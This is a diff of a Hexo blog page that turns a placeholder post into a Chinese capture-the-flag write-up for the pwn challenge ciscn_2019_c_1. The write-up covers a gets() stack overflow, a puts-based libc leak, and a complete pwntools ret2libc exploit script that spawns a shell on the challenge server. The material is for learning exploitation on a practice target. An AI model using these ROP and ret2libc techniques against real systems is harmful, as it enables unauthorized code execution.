@@ -16,24 +16,26 @@
   <meta name="author" content="Hush">
   <meta name="keywords" content="">
   
-    <meta name="description" content="首次使用Hexo。">
+    <meta name="description" content="分析 F5反汇编main函数后，会让我们选择函数。我们注意到  encrypt函数中存在着gets(s) 栈溢出漏洞。 但是并没有存在system函数，所以我们不能直接利用。 所以我们要用ret2libc技术，先考虑泄露libc基地址。 在mian和encrypt函数中都出现了puts函数 我们知道根据延迟绑定技术： plt表中的函数如果没有被调用过，那么got表中该函数的对应项则指向plt表的第">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello Hexo">
-<meta property="og:url" content="https://hushs1gnal.github.io/2022/05/24/hello-world/index.html">
+<meta property="og:title" content="ciscn_2019_c_1">
+<meta property="og:url" content="https://hushs1gnal.github.io/2021/05/25/ciscn_2019_c_1/index.html">
 <meta property="og:site_name" content="Hush&#39;blog">
-<meta property="og:description" content="首次使用Hexo。">
+<meta property="og:description" content="分析 F5反汇编main函数后，会让我们选择函数。我们注意到  encrypt函数中存在着gets(s) 栈溢出漏洞。 但是并没有存在system函数，所以我们不能直接利用。 所以我们要用ret2libc技术，先考虑泄露libc基地址。 在mian和encrypt函数中都出现了puts函数 我们知道根据延迟绑定技术： plt表中的函数如果没有被调用过，那么got表中该函数的对应项则指向plt表的第">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://hushs1gnal.github.io/img/hello.jpg">
-<meta property="article:published_time" content="2022-05-23T19:30:00.000Z">
-<meta property="article:modified_time" content="2022-05-23T19:39:01.685Z">
+<meta property="article:published_time" content="2021-05-24T16:15:00.000Z">
+<meta property="article:modified_time" content="2022-05-24T03:07:49.078Z">
 <meta property="article:author" content="Hush">
-<meta property="article:tag" content="test">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://hushs1gnal.github.io/img/hello.jpg">
   
   
+    <meta name="referrer" content="no-referrer-when-downgrade">
   
-  <title>Hello Hexo - Hush&#39;blog</title>
+  
+  <title>ciscn_2019_c_1 - Hush&#39;blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +198,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello Hexo"></span>
+            <span id="subtitle" data-typed-text="ciscn_2019_c_1"></span>
           
         </div>
 
@@ -207,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-05-24 03:30" pubdate>
-          2022年5月24日 凌晨
+        <time datetime="2021-05-25 00:15" pubdate>
+          2021年5月25日 凌晨
         </time>
       </span>
     
@@ -219,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9 字
+          1.9k 字
         
       </span>
     
@@ -230,12 +232,20 @@
         
         
         
-          1 分钟
+          16 分钟
         
       </span>
     
 
     
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
     
   </div>
 
@@ -268,11 +278,32 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Hello Hexo</h1>
+            <h1 style="display: none">ciscn_2019_c_1</h1>
             
             <div class="markdown-body">
               
-              <p>首次使用Hexo。</p>
+              <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/img/ciscn_2019_c_1-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>F5反汇编main函数后，会让我们选择函数。我们注意到</p>
+<p><img src="/img/ciscn_2019_c_1-2.png" srcset="/img/loading.gif" lazyload alt="ciscn_2019_c_1-2"></p>
+<p>encrypt函数中存在着gets(s) 栈溢出漏洞。</p>
+<p>但是并没有存在system函数，所以我们不能直接利用。</p>
+<p>所以我们要用ret2libc技术，先考虑泄露libc基地址。</p>
+<p>在mian和encrypt函数中都出现了puts函数</p>
+<p>我们知道根据延迟绑定技术：</p>
+<p><em>plt表中的函数如果没有被调用过，那么got表中该函数的对应项则指向plt表的第二行指令。当完成了第一次调用后，got表中会存放函数的真实地址，plt表这时候只起到调用的作用。</em></p>
+<h1 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h1><p>所以，puts函数既被函数调用了，又可以输出一些东西，可以成为我们ret2libc技术的好帮手。</p>
+<p>所以我们第一个payload1应该是</p>
+<p><code>payload1=b&quot;a&quot;*88+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</code></p>
+<p>第一次写，我可能写的比较啰嗦</p>
+<p>记一下笔记：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. ‘a&#x27;*<span class="hljs-number">88</span>前加b的原因是 py3中 char类型想要用+拼接要加上b强制转换。<br><span class="hljs-attribute">2</span>. pop_rdi_addr  是因为在x64中，函数调用优先使用寄存器。超过<span class="hljs-number">6</span>个参数后才使用栈传参。<br><span class="hljs-attribute">3</span>. puts_got是把puts函数的真实地址传递给rdi<br><span class="hljs-attribute">4</span>. puts_plt用于作为返回地址调用函数<br><span class="hljs-attribute">5</span>. 最后我们再次进入整个程序。<br></code></pre></td></tr></table></figure>
+
+<p>接下来我们提交过后需要接收puts函数的真实位置，再根据libc不同版本下puts函数的偏移，来计算出libc基地址。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">puts=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-selector-attr">[:-1]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\0&#x27;</span>))`<br><br><span class="hljs-selector-attr">[:-1]</span>代表的是取该行字符串除去最后一个字符外的字符串。（可能是因为最后一个字符是个换行符）<br><br><span class="hljs-function"><span class="hljs-title">ljust</span><span class="hljs-params">(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\0&#x27;</span>)</span></span>的意思是 接收<span class="hljs-number">8</span>个字符，再加上\<span class="hljs-number">0</span> 成为一个字符串<br></code></pre></td></tr></table></figure>
+
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>接下来暴露了libc地址，就是简单的rop了</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br>context.<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">ru</span>=lambda x:io.recvuntil(x)<br><span class="hljs-attribute">rl</span>=lambda :io.recvline()<br><span class="hljs-attribute">sla</span>=lambda x,y:io.sendlineafter(x,y)<br><span class="hljs-attribute">io</span>=remote(&#x27;node3.buuoj.cn&#x27;,******)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./ciscn_2019_c_1&#x27;)<br><span class="hljs-attribute">ret</span>=0x4006b9<br><span class="hljs-attribute">pop_rdi</span>=0x400c83<br><span class="hljs-attribute">main</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-attribute">payload</span>=b&#x27;\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>sla(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>rl()<br>rl()<br><span class="hljs-attribute">puts</span>=u64(ru(&#x27;\n&#x27;)[:-1].ljust(8,b<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;puts&#x27;,puts)<br><span class="hljs-attribute">libc_addr</span>=puts-libc.dump(&#x27;puts&#x27;)<br><span class="hljs-attribute">binsh</span>=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">system</span>=libc_addr+libc.dump(&#x27;system&#x27;)<br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-attribute">payload</span>=b&#x27;\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>sla(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
 
               
             </div>
@@ -290,12 +321,12 @@
     
       <span class="category-chain">
         
-  <a href="/categories/test/" class="category-chain-item">test</a>
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
   
   
     <span>></span>
     
-  <a href="/categories/test/firsttest/" class="category-chain-item">firsttest</a>
+  <a href="/categories/Pwn/stack/" class="category-chain-item">stack</a>
   
   
 
@@ -312,7 +343,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/test/">#test</a>
+        <a href="/tags/pwn/">#pwn</a>
       
     </div>
   
@@ -324,8 +355,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello Hexo</div>
-      <div>https://hushs1gnal.github.io/2022/05/24/hello-world/</div>
+      <div>ciscn_2019_c_1</div>
+      <div>https://hushs1gnal.github.io/2021/05/25/ciscn_2019_c_1/</div>
     </div>
     <div class="license-meta">
       
@@ -337,7 +368,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年5月24日</div>
+          <div>2021年5月25日</div>
         </div>
       
       
@@ -377,6 +408,31 @@
             </div>
 
             
+  <article id="comments" lazyload>
+    
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    
+      <script type="text/javascript">
+        var disqus_config = function() {
+          this.page.url = 'https://hushs1gnal.github.io/2021/05/25/ciscn_2019_c_1/';
+          this.page.identifier = '/2021/05/25/ciscn_2019_c_1/';
+        };
+        Fluid.utils.loadComments('#disqus_thread', function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//' + 'fluid' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        });
+      </script>
+    
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+  </article>
+
+
           </article>
         </div>
       </div>
@@ -654,6 +710,8 @@
   <script>Fluid.plugins.imageCaption();</script>
 
   <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
